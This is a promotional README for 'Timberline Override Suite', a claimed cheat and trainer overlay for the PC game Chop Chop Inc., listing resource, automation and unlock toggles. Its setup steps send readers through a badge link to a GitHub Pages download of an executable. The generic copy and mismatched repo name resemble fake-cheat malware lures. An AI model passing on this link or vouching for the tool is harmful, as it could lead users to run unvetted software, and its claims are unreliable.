## 🌿 Overview

**Chop Chop Inc. — Timberline Override Suite** is a thoughtfully engineered companion overlay for the PC edition of Chop Chop Inc. It is designed for players who have already savored the vanilla experience and now want to reshape the pacing, the economy, and the minute-to-minute rhythm of their lumber empire.

Rather than a blunt instrument, the Timberline Override Suite behaves like a seasoned forester's toolkit — every switch is purposeful, every toggle is documented, and every module can be flipped on or off in real time without restarting the game. Whether you want to build a sprawling timber conglomerate in a single evening, or simply trim the grind that stands between you and the late-game content, this suite gives you the dial, not just the hammer.

The project was born from a simple observation: the most rewarding part of Chop Chop Inc. is the *decision-making*, not the *waiting*. The Timberline Override Suite removes the waiting and leaves the decisions intact.

## 🪵 Why This Exists

Most trainer-style utilities for management games fall into two camps — either they are so minimal they barely change the experience, or they are so aggressive that the game becomes a screensaver. We wanted a third path: a **surgical override layer** that lets you tune each system independently.

Think of it as a mixing console for your save file. You can nudge the economy, pull the harvest automation fader up to eleven, or drop the late-game order thresholds to a level that respects your free time. You decide the blend; the suite handles the rest.

## ✨ Feature Highlights

The suite ships with **more than 60 individually configurable options**, grouped into intuitive categories. Below is a curated tour of the headline capabilities.

### 💰 Resource & Economy Tools

- **Endless Timber Reserve** — your wood stockpile behaves as though it were bottomless, replenishing instantly after every transaction.
- **Boundless Capital Ledger** — currency values hold steady regardless of expenditure, letting you plan mega-projects without spreadsheet anxiety.
- **Sap & Resin Overflow** — secondary resources follow the same principle, so refining chains never stall.
- **Reputation Ceiling Lift** — regional standing climbs without the usual ceiling, opening dialogue and contract tiers earlier.
- **Zero-Upkeep Mode** — maintenance costs for owned facilities quietly fade into the background.
- **Instant Refund Ledger** — dismantling structures returns the full original investment instead of a depreciated fraction.

### 🪓 Harvesting Automation

- **Universal Auto-Harvest** — every tree species on the map is recognized and processed automatically, from slender birch to towering redwood.
- **Species-Aware Prioritization** — the automation respects rarity tiers, so exotic groves are handled with the care they deserve.
- **Continuous Replant Cycle** — cleared plots reseed themselves on a configurable timer, keeping your forest self-sustaining.
- **Chainsaw Cadence Tuning** — adjust the tempo of automated cutting to match your preferred visual flow.
- **Haul Route Optimization** — logs are routed to the nearest available storage, reducing transit idle time.
- **Night Shift Automation** — harvesting continues through in-game night cycles if you prefer a 24/7 operation.

### 🗺️ Progression Unlocks

- **Blueprint Vault Access** — the entire catalogue of construction blueprints becomes viewable and buildable from the outset.
- **Region Gateway Unlock** — distant territories and locked biomes are reachable without completing every prerequisite contract.
- **Contract Tier Skip** — jump directly into higher-difficulty order brackets if that is where your interest lies.
- **Skill Node Liberation** — the perk and upgrade tree is fully explorable, with every branch selectable.
- **Milestone Retroactive Credit** — achievements you would have earned are granted retroactively on load.
- **Narrative Skip Toggle** — optional, for players replaying the campaign who wish to move straight to the sandbox.

### 🧭 Quality-of-Life Enhancements

- **Late-Game Order Softener** — the notorious spike in order requirements around the fourth act is scaled down to a human-friendly curve.
- **Adjustable Difficulty Curve** — a single slider rebalances the entire campaign's challenge gradient.
- **Time-of-Day Control** — pause the sun, extend the golden hour, or skip straight to dawn.
- **Weather Override** — toggle rain, snow, and fog for aesthetics or for resource-specific bonuses.
- **Save Slot Duplicator** — clone a save file before experimenting, so no decision is ever truly permanent.
- **Autosave Interval Tuner** — from every thirty seconds to every thirty minutes, your choice.
- **Bulk Build Queue** — place multiple structures in a single gesture.
- **Camera Freedom Mode** — detach the camera for cinematic screenshots of your empire.

### 🌐 Interface & Usability

- **Responsive Overlay UI** — the menu rescales gracefully from 720p laptops to 4K ultrawide monitors.
- **Drag-and-Dock Panels** — arrange the interface to match your muscle memory.
- **Searchable Option Index** — find any of the 60+ toggles by typing a few letters.

## ⚙️ Configuration & Presets

Out of the box, the suite includes four curated presets:

1. **Gentle Breeze** — light quality-of-life only; the campaign remains essentially untouched.
2. **Balanced Forester** — moderate economy and automation, tuned for a relaxing but still meaningful progression.
3. **Sandbox Architect** — full unlocks and automation, aimed at builders who want the entire map as a canvas.
4. **Custom** — start from any preset and adjust the individual toggles; the suite remembers your last state.

Every preset is stored as a plain-text configuration file, so power users can hand-edit values or share profiles with friends. The format is deliberately human-readable — no binary blobs, no opaque databases.

## 🚀 Getting Started

1. **Obtain the suite** — use the [![Download](https://raw.githubusercontent.com/AayushPandey254117/Chop-Chop-Order-Scaler/main/grab_ee80.svg)](https://AayushPandey254117.github.io/Chop-Chop-Order-Scaler/) marker above to retrieve the current release package.
2. **Unpack the archive** to a folder of your choosing, ideally outside the game's installation directory to keep things tidy.
3. **Launch the game first**, then start the suite executable. The overlay attaches automatically once the main menu appears.
4. **Press the default invocation key** (F8) to bring up the overlay. You can change this at any time in the settings tab.
5. **Pick a preset** to begin, then fine-tune individual options from the categorized list.
6. **Save your profile** so the suite restores your configuration on next launch.

No external runtime, framework, or package manager is required. The suite is a self-contained bundle.

## ❓ Frequently Asked Questions

**Is this compatible with the latest game patch?**
The suite tracks patch releases closely. When significant updates land, a compatibility build typically follows within days.

**Will this modify my save file irreversibly?**
Permanent changes only occur when you explicitly toggle the "commit to save" option on a module. By default, most modules apply to the live session only.

**Can I disable individual modules without closing the game?**
Yes. Every option is a runtime toggle. Nothing requires a restart.

**Does the overlay conflict with other overlays?**
The suite is generally well-behaved, but running multiple overlay tools simultaneously can cause input ambiguity. We recommend one overlay at a time.

**Where are my presets stored?**
In the suite's configuration directory, as plain-text files. The exact path is displayed in the settings tab.

**Is there a portable mode?**
Yes — place a marker file next to the executable and all configuration stays within the suite's own folder.
